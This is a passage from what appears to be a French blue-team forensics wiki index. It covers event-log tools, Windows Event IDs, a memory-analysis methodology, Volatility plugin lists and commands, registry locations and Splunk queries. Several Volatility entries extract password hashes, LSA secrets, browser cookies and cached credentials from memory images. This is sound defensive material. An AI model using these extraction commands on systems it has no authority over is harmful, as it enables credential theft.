Application\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#filtrage-et-recherche","title":"Filtrage et Recherche","text":"<p>Analyser en filtrant par ID d'\u00e9v\u00e9nement</p> <pre><code>.\\DeepBlue.ps1 -log Security | Where-Object { $_.Id -eq 4625 }`\n</code></pre> <p>Recherche de termes sp\u00e9cifiques dans les r\u00e9sultats</p> <pre><code>.\\DeepBlue.ps1 -log Security | Select-String -Pattern \"terme_recherch\u00e9\"\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/DeepBlueCli/#exportation-des-resultats","title":"Exportation des R\u00e9sultats","text":"<p>Exporter les r\u00e9sultats dans un fichier</p> <pre><code>.\\DeepBlue.ps1 -log Security | Out-File -FilePath .\\resultats_analyse.txt\n</code></pre>"},{"location":"Blue%20Team/Forensic/Logs/Hayabusa/","title":"Hayabusa","text":"<p>https://github.com/Yamato-Security/hayabusa</p> <p>Hayabusa est un outil d\u00e9velopp\u00e9 par le groupe Yamato Security au Japon pour g\u00e9n\u00e9rer rapidement des chronologies forensiques \u00e0 partir des journaux d'\u00e9v\u00e9nements Windows, facilitant ainsi la chasse aux menaces. </p> <p>Le nom \"Hayabusa\", qui signifie \"faucon p\u00e8lerin\" en japonais, a \u00e9t\u00e9 choisi en r\u00e9f\u00e9rence \u00e0 la vitesse et \u00e0 l'efficacit\u00e9 de cet oiseau pour la chasse. </p> <p>Cet outil, programm\u00e9 en Rust, utilise le multi-threading pour maximiser sa rapidit\u00e9. Nous avons aussi mis en place un moyen de convertir les r\u00e8gles Sigma en format compatible avec Hayabusa. </p> <p>Ces r\u00e8gles de d\u00e9tection, r\u00e9dig\u00e9es en YML, sont con\u00e7ues pour \u00eatre ais\u00e9ment personnalisables et extensibles. Hayabusa peut \u00eatre utilis\u00e9 pour des analyses en temps r\u00e9el sur des syst\u00e8mes individuels, pour des analyses hors ligne en rassemblant les journaux de plusieurs syst\u00e8mes, ou m\u00eame en combinaison avec Velociraptor pour une recherche de menaces et une r\u00e9ponse aux incidents \u00e0 l'\u00e9chelle de l'entreprise. </p> <p>Les r\u00e9sultats sont rassembl\u00e9s dans un fichier CSV unique, rendant l'analyse plus ais\u00e9e sur des outils comme LibreOffice, Timeline Explorer, Elastic Stack, Timesketch, etc.</p> <p>Un binaire est disponible sur Windows/Linux/MacOS.</p> <p>Export en json + html : <pre><code>./hayabusa json-timeline -d /chemin/vers/evtx -o /chemin/vers/output.json -H /chemin/vers/output.html\n</code></pre></p> <p>Export en csv + html : <pre><code>./hayabusa csv-timeline -d /chemin/vers/evtx -o /chemin/vers/output.csv -H /chemin/vers/output.html\n</code></pre></p>"},{"location":"Blue%20Team/Forensic/Logs/Liste%20EventID/","title":"Liste EventID","text":"<p>4624: Succ\u00e8s de connexion - Indique un succ\u00e8s de connexion \u00e0 un compte.</p> <p>4625: \u00c9chec de connexion - Signale une tentative de connexion \u00e9chou\u00e9e, utile pour d\u00e9tecter des tentatives de force brute.</p> <p>4648: Utilisation explicite des identifiants - Utile pour suivre les connexions o\u00f9 des identifiants sont explicitement utilis\u00e9s.</p> <p>4672: Attribution de privil\u00e8ges sp\u00e9ciaux lors de la connexion - Indique qu'un utilisateur s'est connect\u00e9 avec des privil\u00e8ges administratifs.</p> <p>4688: Cr\u00e9ation d'un nouveau processus - Utile pour surveiller l'ex\u00e9cution de processus potentiellement malveillants.</p> <p>4720: Cr\u00e9ation d'un compte utilisateur - Indique la cr\u00e9ation d'un nouveau compte utilisateur.</p> <p>4728: Ajout d'un membre \u00e0 un groupe de s\u00e9curit\u00e9 global - Important pour surveiller les modifications des groupes de s\u00e9curit\u00e9.</p> <p>4732: Ajout d'un membre \u00e0 un groupe de s\u00e9curit\u00e9 local - Similaire \u00e0 l'ID 4728 mais pour les groupes locaux.</p> <p>4740: Compte d'utilisateur verrouill\u00e9 - Indique qu'un compte a \u00e9t\u00e9 verrouill\u00e9, souvent apr\u00e8s plusieurs tentatives de connexion \u00e9chou\u00e9es.</p> <p>4767: Compte d'utilisateur d\u00e9verrouill\u00e9 - Peut indiquer une activit\u00e9 administrative ou suspecte.</p> <p>4771: \u00c9chec de la validation Kerberos - Utile pour d\u00e9tecter des probl\u00e8mes d'authentification ou des tentatives d'attaque.</p> <p>4776: Validation d'identifiants - Surveillance des tentatives de connexion via le protocole NTLM.</p> <p>4781: Renommage d'un compte utilisateur - Peut indiquer une tentative de dissimulation ou de modification des droits d'acc\u00e8s.</p> <p>4798: Un utilisateur a effectu\u00e9 une requ\u00eate li\u00e9e \u00e0 un groupe - Utile pour surveiller les requ\u00eates li\u00e9es aux appartenances de groupe.</p> <p>4799: Un groupe de s\u00e9curit\u00e9 global a \u00e9t\u00e9 interrog\u00e9 - Compl\u00e9mentaire \u00e0 l'ID 4798 pour les groupes de s\u00e9curit\u00e9.</p>"},{"location":"Blue%20Team/Forensic/Memoire/Dump%20m%C3%A9moire/","title":"Dump m\u00e9moire","text":"<p>WinPmem : https://github.com/Velocidex/WinPmem</p> <p>DumpIT : https://www.magnetforensics.com/resources/magnet-dumpit-for-windows/</p> <p>Memdump : http://www.nirsoft.net/utils/nircmd.html</p> <p>LiME (linux) : https://github.com/504ensicsLabs/LiME</p>"},{"location":"Blue%20Team/Forensic/Memoire/Methodologie/","title":"Methodologie","text":"<ol> <li> <p>Identification et V\u00e9rification des Processus : Commen\u00e7ons par identifier tous les processus actifs. Les logiciels malveillants se d\u00e9guisent souvent en processus l\u00e9gitimes, parfois avec de l\u00e9g\u00e8res variations de noms pour \u00e9viter la d\u00e9tection. Nous devons :</p> <ul> <li>\u00c9num\u00e9rer tous les processus en cours d'ex\u00e9cution.</li> <li>D\u00e9terminer leur origine dans le syst\u00e8me d'exploitation.</li> <li>Les recouper avec les processus l\u00e9gitimes connus.</li> <li>Souligner toutes les divergences ou conventions de nommage suspectes.</li> </ul> </li> <li> <p>Examen Approfondi des Composants du Processus : Une fois que nous avons signal\u00e9 les processus potentiellement voyous, notre prochaine \u00e9tape est d'examiner les biblioth\u00e8ques de liens dynamiques (DLL) et les handles associ\u00e9s. Les logiciels malveillants exploitent souvent les DLL pour dissimuler leurs activit\u00e9s. Nous devrions :</p> <ul> <li>Examiner les DLL li\u00e9es au processus suspect.</li> <li>V\u00e9rifier l'existence de DLL non autoris\u00e9es ou malveillantes.</li> <li>Enqu\u00eater sur tout signe d'injection ou de d\u00e9tournement de DLL.</li> </ul> </li> <li> <p>Analyse de l'Activit\u00e9 R\u00e9seau : De nombreux types de logiciels malveillants, en particulier ceux qui op\u00e8rent par \u00e9tapes, n\u00e9cessitent une connectivit\u00e9 Internet. Ils peuvent se connecter \u00e0 des serveurs de commande et de contr\u00f4le (C2) ou exfiltrer des donn\u00e9es. Pour d\u00e9couvrir ces \u00e9l\u00e9ments :</p> <ul> <li>Examiner les connexions r\u00e9seau actives et passives dans la m\u00e9moire du syst\u00e8me.</li> <li>Identifier et documenter les adresses IP externes et les domaines associ\u00e9s.</li> <li>D\u00e9terminer la nature et le but de la communication.</li> <li>Valider la l\u00e9gitimit\u00e9 du processus.</li> <li>\u00c9valuer si le processus n\u00e9cessite normalement une communication r\u00e9seau.</li> <li>Remonter jusqu'au processus parent.</li> <li>\u00c9valuer son comportement et sa n\u00e9cessit\u00e9.</li> </ul> </li> <li> <p>D\u00e9tection d'Injection de Code : Les adversaires avanc\u00e9s utilisent souvent des techniques telles que le vidage de processus ou l'utilisation de sections de m\u00e9moire non mapp\u00e9es. Pour contrer cela, nous devrions :</p> <ul> <li>Utiliser des outils d'analyse de la m\u00e9moire pour d\u00e9tecter des anomalies ou des signes de ces techniques.</li> <li>Identifier tout processus qui semble occuper des espaces m\u00e9moire inhabituels ou pr\u00e9senter des comportements inattendus.</li> </ul> </li> <li> <p>D\u00e9couverte de Rootkits : Atteindre la discr\u00e9tion et la persistance est un objectif commun pour les adversaires. Les rootkits, qui s'incrustent profond\u00e9ment dans le syst\u00e8me d'exploitation, accordent aux acteurs de la menace un acc\u00e8s continu, souvent \u00e9lev\u00e9, au syst\u00e8me tout en \u00e9chappant \u00e0 la d\u00e9tection. Pour aborder cela :</p> <ul> <li>Rechercher des signes d'activit\u00e9 de rootkit ou de modifications profondes du syst\u00e8me d'exploitation.</li> <li>Identifier tout processus ou pilote op\u00e9rant avec des privil\u00e8ges anormalement \u00e9lev\u00e9s ou pr\u00e9sentant des comportements de dissimulation.</li> </ul> </li> <li> <p>Extraction d'\u00c9l\u00e9ments Suspects : Apr\u00e8s avoir identifi\u00e9 des processus, pilotes ou ex\u00e9cutables suspects, nous devons les isoler pour une analyse approfondie. Cela implique :</p> <ul> <li>Extraire les composants suspects de la m\u00e9moire.</li> <li>Les stocker en toute s\u00e9curit\u00e9 pour un examen ult\u00e9rieur \u00e0 l'aide d'outils forensiques sp\u00e9cialis\u00e9s.</li> </ul> </li> </ol>"},{"location":"Blue%20Team/Forensic/Memoire/Volatility2/Modules/","title":"Modules","text":"<p><pre><code>```shell-session\nagtidconfig     Parse the Agtid configuration\namcache         Print AmCache information\nantianalysis\napifinder\napihooks        Detect API hooks in process and kernel memory\napihooksdeep    Detect API hooks in process and kernel memory, with ssdeep for whitelisting\napt17scan       Detect processes infected with APT17 malware\natoms           Print session and window station atom tables\natomscan        Pool scanner for atom tables\nattributeht     Find Hacking Team implants and attempt to attribute them using a watermark.\nauditpol        Prints out the Audit Policies from HKLM\\SECURITY\\Policy\\PolAdtEv\nautoruns        Searches the registry and memory space for applications running at system startup and maps them to running processes\nbigpools        Dump the big page pools using BigPagePoolScanner\nbioskbd         Reads the keyboard buffer from Real Mode memory\nbitlocker       Extract Bitlocker FVEK. Supports Windows 7 - 10.\ncachedump       Dumps cached domain hashes from memory\ncallbacks       Print system-wide notification routines\ncallstacks      this is the plugin class for callstacks\nchromecookies   Scans for and parses potential Chrome cookie data\nchromedownloadchains    Scans for and parses potential Chrome download chain records\nchromedownloads Scans for and parses potential Chrome download records\nchromehistory   Scans for and parses potential Chrome url history\nchromesearchterms       Scans for and parses potential Chrome keyword search terms\nchromevisits    Scans for and parses potential Chrome url visits data -- VERY SLOW, see -Q option\nclipboard       Extract the contents of the windows clipboard\ncmdline         Display process command-line arguments\ncmdscan         Extract command history by scanning for _COMMAND_HISTORY\nconnections     Print list of open connections [Windows XP and 2003 Only]\nconnscan        Pool scanner for tcp connections\nconsoles        Extract command history by scanning for _CONSOLE_INFORMATION\ncrashinfo       Dump crash-dump information\nderusbiconfig   Parse the Derusbi configuration\ndeskscan        Poolscaner for tagDESKTOP (desktops)\ndevicetree      Show device tree\ndirectoryenumerator     Enumerates all unique directories from FileScan\ndlldump         Dump DLLs from a process address space\ndlllist         Print list of loaded dlls for each process\ndriverbl        Scans memory for driver objects and compares the results with the baseline image\ndriverirp       Driver IRP hook detection\ndriveritem\ndrivermodule    Associate driver objects to kernel modules\ndriverscan      Pool scanner for driver objects\ndumpcerts       Dump RSA private and public SSL keys\ndumpfiles       Extract memory mapped and cached files\ndumpregistry    Dumps registry files out to disk\ndyrescan        Extract Dyre Configuration from processes\neditbox         Displays information about Edit controls. (Listbox experimental.)\nenvars          Display process environment variables\neventhooks      Print details on windows event hooks\nevtlogs         Extract Windows Event Logs (XP/2003 only)\nfacebook        Retrieve facebook artifacts from a memory image\nfacebookcontacts        Finds possible Facebook contacts\nfacebookgrabinfo        Carves the memory dump for Owners personal info JSON struct.\nfacebookmessages        Carves the memory for every message exchanged between the Owner and another contact\nileitem\nfilescan        Pool scanner for file objects\nfirefoxcookies  Scans for and parses potential Firefox cookies (cookies.sqlite moz_cookies table\nfirefoxdownloads        Scans for and parses potential Firefox download records -- downloads.sqlite moz_downloads table pre FF26 only\nfirefoxhistory  Scans for and parses potential Firefox url history (places.sqlite moz_places table)\nfwhooks         Enumerates modules which are using Firewall Hook Drivers on Windows 2000/XP/2003\ngahti           Dump the USER handle type information\ngditimers       Print installed GDI timers and callbacks\ngdt             Display Global Descriptor Table\ngetservicesids  Get the names of services in the Registry and return Calculated SID\ngetsids         Print the SIDs owning each process\nghostrat        Detects and decrypts Gh0stRat communication\nhandles         Print list of open handles for each process\nhashdump        Dumps passwords hashes (LM/NTLM) from memory\nhibinfo         Dump hibernation file information\nhikitconfig     Parse the Hikit configuration\nhivedump        Prints out a hive\nhivelist        Print list of registry hives.\nhivescan        Pool scanner for registry hives\nhollowfind      Detects different types of Process Hollowing\nhookitem\nhpakextract     Extract physical memory from an HPAK file\nhpakinfo        Info on an HPAK file\nhpv_clipboard   Dump Virtual Machine Clipboard data\nhpv_vmconnect   Virtual Machine Console data\nhpv_vmwp        Display the Virtual Machine Process GUID for each running vm\nidt             Display Interrupt Descriptor Table\nidxparser       Scans for and parses Java IDX files\niehistory       Reconstruct Internet Explorer cache / history\nimagecopy       Copies a physical address space out as a raw DD image\nimageinfo       Identify information for the image\nimpscan         Scan for calls to imported functions\nindx            Scans for and parses potential INDX entries\njoblinks        Print process job link information\nkdbgscan        Search for and dump potential KDBG values\nkpcrscan        Search for and dump potential KPCR values\nlastpass        Extract lastpass data from process.\nldrmodules      Detect unlinked DLLs\nlinuxgetprofile Scan to try to determine the Linux profile\nlogfile         Scans for and parses potential $Logfile entries\nlsadump         Dump (decrypted) LSA secrets from the registry\nmachoinfo       Dump Mach-O file format information\nmalfind         Find hidden and injected code\nmalfinddeep     Find hidden and injected code, whitelist with ssdeep hashes\nmalfofind       Find indications of process hollowing/RunPE injections\nmalprocfind     Finds malicious processes based on discrepancies from observed, normal behavior and properties\nmalthfind       Find malicious threads by analyzing their callstack\nmbrparser       Scans for and parses potential Master Boot Records (MBRs)\nmemdump         Dump the addressable memory for a process\nmemmap          Print the memory map\nmessagehooks    List desktop and thread window message hooks\nmftparser       Scans for and parses potential MFT entries\nmimikatz        mimikatz offline\nmoddump         Dump a kernel driver to an executable file sample\nmodscan         Pool scanner for kernel modules\nmodules         Print list of loaded modules\nmsdecompress    Carves and dumps Lznt1, Xpress and Xpress huffman Compressioned data blocks in a processes pagespace\nmultiscan       Scan for various objects at once\nmutantscan      Pool scanner for mutex objects\nndispktscan     Extract the packets from memory\nnetworkpackets  Carve and analyze ARP/IPv4 network packets from memory\nnotepad         List currently displayed notepad text\nobjtypescan     Scan for Windows object type objects\nopenioc_scan    Scan OpenIOC 1.1 based indicators\nopenvpn         Extract OpenVPN client credentials (username, password) cached in memory.\nosint           Check Url/ip extracted from memory against opensource intelligence platforms\npatcher         Patches memory based on page scans\nplugxconfig     Locate and parse the PlugX configuration\nplugxscan       Detect processes infected with PlugX\npoolpeek        Configurable pool scanner plugin\nprefetchparser  Scans for and parses potential Prefetch files\nprintkey        Print a registry key, and its subkeys and values\nprivs           Display process privileges\nprocdump        Dump a process to an executable file sample\nprocessbl       Scans memory for processes and loaded DLLs and compares the results with the baseline\nprofilescan     Scan for executables to try to determine the underlying OS\npsinfo          Displays process related information and suspicious memory regions\npslist          Print all running processes by following the EPROCESS lists\npsscan          Pool scanner for process objects\npstotal         Combination of pslist,psscan &amp; pstree --output=dot gives graphical representation\npstree          Print process list as a tree\npsxview         Find hidden processes with various process listings\nqemuinfo        Dump Qemu information\nraw2dmp         Converts a physical memory sample to a windbg crash dump\nregistryitem\nrsakey          Extract base64/PEM encoded private RSA keys from physical memory.\nscreenshot      Save a pseudo-screenshot based on GDI windows\nservicebl       Scans memory for service objects and compares the results with the baseline image\nservicediff     List Windows services (ala Plugx)\nserviceitem\nsessions        List details on _MM_SESSION_SPACE (user logon sessions)\nshellbags       Prints ShellBags info\nshimcache       Parses the Application Compatibility Shim Cache registry key\nshimcachemem    Parses the Application Compatibility Shim Cache stored in kernel memory\nshutdowntime    Print ShutdownTime of machine from registry\nsockets         Print list of open sockets\nsockscan        Pool scanner for tcp socket objects\nssdeepscan      Scan process or kernel memory with SSDeep signatures\nssdt            Display SSDT entries\nstrings         Match physical offsets to virtual addresses (may take a while, VERY verbose)\nsvcscan         Scan for Windows services\nsymlinkscan     Pool scanner for symlink objects\nsysteminfo      Print common system details of machine from registry\nthrdscan        Pool scanner for thread objects\nthreads         Investigate _ETHREAD and _KTHREADs\ntimeliner       Creates a timeline from various artifacts in memory\ntimers          Print kernel timers and associated module DPCs\ntruecryptmaster Recover TrueCrypt 7.1a Master Keys\ntruecryptpassphrase     TrueCrypt Cached Passphrase Finder\ntruecryptsummary        TrueCrypt Summary\ntrustrecords    Extract MS Office TrustRecords from the Registry\ntwitter         Retrieve twitter artifacts from a memory image\nuninstallinfo   Extract installed software info from Uninstall registry key\nunloadedmodules Print list of unloaded modules\nusbstor         Parse USB Data from the Registry\nuserassist      Print userassist registry keys and information\nuserhandles     Dump the USER handle tables\nusnjrnl         Scans for and parses potential USNJRNL entries\nusnparser       Scans for and parses USN journal records\nvaddump         Dumps out the vad sections to a file\nvadinfo         Dump the VAD info\nvadtree         Walk the VAD tree and display in tree format\nvadwalk         Walk the VAD tree\nvboxinfo        Dump virtualbox information\nverinfo         Prints out the version information from PE images\nvmwareinfo      Dump VMware VMSS/VMSN information\nvolshell        Shell in the memory image\nwindows         Print Desktop Windows (verbose details)\nwintree         Print Z-Order Desktop Windows Tree\nwndscan         Pool scanner for window stations\nyarascan        Scan process or kernel memory with Yara signatures \n</code></pre> ```</p>"},{"location":"Blue%20Team/Forensic/Memoire/Volatility3/CheatSheet/","title":"CheatSheet","text":"<p>Identifier le format de l'image m\u00e9moire :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.info\n</code></pre> <p>Lister les plugins disponibles :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] --plugins=[chemin_plugins] windows.info\n</code></pre>"},{"location":"Blue%20Team/Forensic/Memoire/Volatility3/CheatSheet/#analyse-des-processus","title":"Analyse des Processus","text":"<p>Lister les processus en cours d'ex\u00e9cution :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.pslist\n</code></pre> <p>Voir les processus avec leur arborescence :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.pstree\n</code></pre> <p>V\u00e9rifier les processus cach\u00e9s ou non r\u00e9pertori\u00e9s :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.psxview\n</code></pre>"},{"location":"Blue%20Team/Forensic/Memoire/Volatility3/CheatSheet/#analyse-de-la-memoire","title":"Analyse de la M\u00e9moire","text":"<p>Extraire le contenu de la m\u00e9moire d'un processus :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.memdump --pid [pid_processus] --dump-dir=[dossier_destination]\n</code></pre> <p>Analyser la m\u00e9moire virtuelle d'un processus :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.vadinfo --pid [pid_processus]\n</code></pre>"},{"location":"Blue%20Team/Forensic/Memoire/Volatility3/CheatSheet/#analyse-de-fichiers-et-dll","title":"Analyse de Fichiers et DLL","text":"<p>Lister les DLL charg\u00e9es pour chaque processus :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.dlllist\n</code></pre> <p>Extraire les fichiers ex\u00e9cutables/DLL mapp\u00e9s en m\u00e9moire :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.moddump --pid [pid_processus] --dump-dir=[dossier_destination]\n</code></pre>"},{"location":"Blue%20Team/Forensic/Memoire/Volatility3/CheatSheet/#analyse-de-reseau","title":"Analyse de R\u00e9seau","text":"<p>Voir les connexions r\u00e9seau actives et en \u00e9coute :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.netscan\n</code></pre> <p>Lister les sockets et connexions :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.netstat\n</code></pre>"},{"location":"Blue%20Team/Forensic/Memoire/Volatility3/CheatSheet/#analyse-du-registre","title":"Analyse du Registre","text":"<p>Extraire les hives du registre :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.registry.hivelist\n</code></pre> <p>Analyser les cl\u00e9s de registre sp\u00e9cifiques :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.registry.printkey --key=\"Chemin_de_la_cl\u00e9\"\n</code></pre>"},{"location":"Blue%20Team/Forensic/Memoire/Volatility3/CheatSheet/#analyse-avancee","title":"Analyse Avanc\u00e9e","text":"<p>D\u00e9tecter des rootkits ou des anomalies dans le noyau :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.malfind\n</code></pre> <p>Analyser les crash dumps :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.crashinfo\n</code></pre>"},{"location":"Blue%20Team/Forensic/Memoire/Volatility3/CheatSheet/#utilitaires-et-divers","title":"Utilitaires et Divers","text":"<p>Extraire les mots de passe et les hashes :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.hashdump\n</code></pre> <p>Rechercher des cha\u00eenes ou des motifs dans la m\u00e9moire :</p> <pre><code>vol.py -f [fichier_image_m\u00e9moire] windows.strings -s [cha\u00eene_\u00e0_rechercher]\n</code></pre>"},{"location":"Blue%20Team/Forensic/Regedit/Clefs%20de%20registres/","title":"Clefs de registres","text":"<ul> <li>Version de l'OS: <code>SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion</code></li> <li>Control Set: <code>SYSTEM\\ControlSet001</code> (ControlSet avec lequel la machine est d\u00e9marr\u00e9e) - <code>SYSTEM\\ControlSet002</code> (\"last known good\" ControlSet) - <code>HKLM\\SYSTEM\\CurrentControlSet</code> (ControlSet \"volatile\" cr\u00e9e quand la machine est en cours d'utilisation)</li> <li>Nom de la machine: <code>SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName</code></li> <li>TimeZone: <code>SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation</code></li> <li>Configuration r\u00e9seau: <code>SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces</code></li> <li>Autoruns: <code>NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> - <code>NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code> - <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code> - <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run</code> - <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code></li> <li>Services: <code>SYSTEM\\CurrentControlSet\\Services</code></li> <li>Informations sur les utilisateurs: <code>SAM\\Domains\\Account\\Users</code></li> <li>Documents r\u00e9cents: <code>NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs</code></li> <li>Documents r\u00e9cents li\u00e9s \u00e0 Office: <code>NTUSER.DAT\\Software\\Microsoft\\Office\\VERSION</code> - <code>NTUSER.DAT\\Software\\Microsoft\\Office\\15.0\\Word</code> - <code>NTUSER.DAT\\Software\\Microsoft\\Office\\VERSION\\UserMRU\\LiveID_####\\FileMRU</code></li> <li>Recherches effectu\u00e9es dans l'explorer/path acc\u00e9d\u00e9 dans l'explorer: <code>NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths</code> - <code>NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery</code></li> <li></li> </ul>"},{"location":"Blue%20Team/Forensic/Regedit/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":"Folder/predefined key Description HKEY_CURRENT_USER Contient la racine des informations de configuration pour l'utilisateur actuellement connect\u00e9. Les dossiers de l'utilisateur, les couleurs d'\u00e9cran et les param\u00e8tres du panneau de configuration sont stock\u00e9s ici. Ces informations sont associ\u00e9es au profil de l'utilisateur. Cette cl\u00e9 est parfois abr\u00e9g\u00e9e en HKCU. HKEY_USERS Contient tous les profils utilisateur activement charg\u00e9s sur l'ordinateur. HKEY_CURRENT_USER est une sous-cl\u00e9 de HKEY_USERS. HKEY_USERS est parfois abr\u00e9g\u00e9e en HKU. HKEY_LOCAL_MACHINE Contient des informations de configuration particuli\u00e8res \u00e0 l'ordinateur (pour tout utilisateur). Cette cl\u00e9 est parfois abr\u00e9g\u00e9e en HKLM. HKEY_CLASSES_ROOT Est une sous-cl\u00e9 de <code>HKEY_LOCAL_MACHINE\\Software</code>. Les informations stock\u00e9es ici assurent que le programme correct s'ouvre lorsque vous ouvrez un fichier en utilisant l'Explorateur Windows. Cette cl\u00e9 est parfois abr\u00e9g\u00e9e en HKCR.\u00c0 partir de Windows 2000, ces informations sont stock\u00e9es sous les cl\u00e9s HKEY_LOCAL_MACHINE et HKEY_CURRENT_USER. La cl\u00e9 <code>HKEY_LOCAL_MACHINE\\Software\\Classes</code> contient les param\u00e8tres par d\u00e9faut qui peuvent s'appliquer \u00e0 tous les utilisateurs de l'ordinateur local. La cl\u00e9 <code>HKEY_CURRENT_USER\\Software\\Classes</code> contient des param\u00e8tres qui remplacent les param\u00e8tres par d\u00e9faut et s'appliquent uniquement \u00e0 l'utilisateur interactif.La cl\u00e9 HKEY_CLASSES_ROOT fournit une vue du registre qui fusionne les informations provenant de ces deux sources. HKEY_CLASSES_ROOT fournit \u00e9galement cette vue fusionn\u00e9e pour les programmes con\u00e7us pour les versions ant\u00e9rieures de Windows. Pour modifier les param\u00e8tres de l'utilisateur interactif, les changements doivent \u00eatre effectu\u00e9s sous <code>HKEY_CURRENT_USER\\Software\\Classes</code> au lieu de HKEY_CLASSES_ROOT.Pour modifier les param\u00e8tres par d\u00e9faut, les changements doivent \u00eatre effectu\u00e9s sous <code>HKEY_LOCAL_MACHINE\\Software\\Classes</code>. Si vous \u00e9crivez des cl\u00e9s dans une cl\u00e9 sous HKEY_CLASSES_ROOT, le syst\u00e8me stocke les informations sous <code>HKEY_LOCAL_MACHINE\\Software\\Classes</code>.Si vous \u00e9crivez des valeurs dans une cl\u00e9 sous HKEY_CLASSES_ROOT, et que la cl\u00e9 existe d\u00e9j\u00e0 sous <code>HKEY_CURRENT_USER\\Software\\Classes</code>, le syst\u00e8me stockera les informations l\u00e0 au lieu de sous <code>HKEY_LOCAL_MACHINE\\Software\\Classes</code>. HKEY_CURRENT_CONFIG Contient des informations sur le profil mat\u00e9riel utilis\u00e9 par l'ordinateur local au d\u00e9marrage du syst\u00e8me. <ul> <li> <p>Sur le disque, le registre est stock\u00e9 dans <code>C:\\Windows\\System32\\Config</code></p> </li> <li> <p>Aussi, dans les dossier <code>C:\\Users\\$Username\\</code>  se trouvent les fichiers NTUSER.DAT qui correspond \u00e0 la clef <code>HKEY_CURRENT_USER</code> et le fichier USERCLASS.DAT qui correspond \u00e0 la clef <code>HKEY_CURRENT_USER\\Software\\CLASSES</code></p> </li> <li> <p>Le contenu de NTUSER.DAT se trouve dans <code>C:\\Users\\$Username\\AppData\\Local\\Microsoft\\Windows</code>.</p> </li> <li> <p>Le contenu de NTUSER.DAT se trouve dans <code>C:\\Users\\$Username\\</code>.</p> </li> <li> <p>Tout les 10 jours, une sauvegarde des diff\u00e9rents registres est faites, celle-ci peut se retrouver dans le dossier <code>C:\\Windows\\System32\\config\\RegBack</code>.</p> </li> <li>Les clefs Amcache se trouvent dans <code>C:\\Windows\\AppCompat\\Programs\\Amcache.hve</code></li> </ul>"},{"location":"Blue%20Team/Forensic/Regedit/Tools/","title":"Tools","text":"<p>Zimmerman's Registry Explorer : https://ericzimmerman.github.io/#!index.md</p> <p>Autopsy : https://www.autopsy.com/</p> <p>FTK Imager : https://www.exterro.com/digital-forensics-software/ftk-imager</p>"},{"location":"Blue%20Team/Forensic/Splunk/Requ%C3%AAtes/","title":"Requ\u00eates","text":""},{"location":"Blue%20Team/Forensic/Splunk/Requ%C3%AAtes/#requetes-de-base","title":"Requ\u00eates de Base","text":"<p>Recherche Simple :</p> <pre><code>index=[nom_index] \"terme sp\u00e9cifique\"`\n</code></pre> <p>Recherche dans une Plage de Temps :</p> <pre><code>index=[nom_index] earliest=-1h latest=now \"terme sp\u00e9cifique\"`\n</code></pre> <p><code>-1h</code> pour la derni\u00e8re heure, <code>now</code> pour le moment actuel.</p> <p>Utiliser les Jokers :</p> <pre><code>index=[nom_index] source=\"*chemin/fichier*log\"`\n</code></pre>"},{"location":"Blue%20Team/Forensic/Splunk/Requ%C3%AAtes/#filtrage-et-selection","title":"Filtrage et S\u00e9lection","text":"<p>Filtrer par Champ :</p> <pre><code>index=[nom_index] [champ]=[valeur]`\n</code></pre> <p>Utiliser <code>AND</code>, <code>OR</code>, <code>NOT</code> :</p> <pre><code>index=[nom_index] (erreur OR \u00e9chec) AND utilisateurs=\"John Doe\" NOT source=\"/var/log/syslog\"`\n</code></pre>"},{"location":"Blue%20Team/Forensic/Splunk/Requ%C3%AAtes/#commandes-statistiques-et-agregation","title":"Commandes Statistiques et Agr\u00e9gation","text":"<p>Compter les Occurrences :</p> <pre><code>index=[nom_index] | stats count`\n</code></pre> <p>Compter par Cat\u00e9gorie :</p> <pre><code>index=[nom_index] | stats count by [champ]`\n</code></pre> <p>Trouver des Valeurs Uniques :</p> <pre><code>index=[nom_index] | dedup [champ]`\n</code></pre> <p>Calculs Statistiques (Moyenne, Max, Min, etc.) :</p> <pre><code>index=[nom_index] | stats avg([champ]), max([champ]), min([champ])`\n</code></pre>"},{"location":"Blue%20Team/Forensic/Splunk/Requ%C3%AAtes/#tri-et-limitation","title":"Tri et Limitation","text":"<p>Trier les R\u00e9sultats :</p> <p><pre><code>index=[nom_index] | sort - [champ]`\n</code></pre> <code>-</code> pour trier en ordre d\u00e9croissant.</p> <p>Limiter les R\u00e9sultats :</p> <p><pre><code>index=[nom_index] | head 10`\n</code></pre> Affiche les 10 premiers r\u00e9sultats.</p>"},{"location":"Blue%20Team/Forensic/Splunk/Requ%C3%AAtes/#groupement-et-subdivisions","title":"Groupement 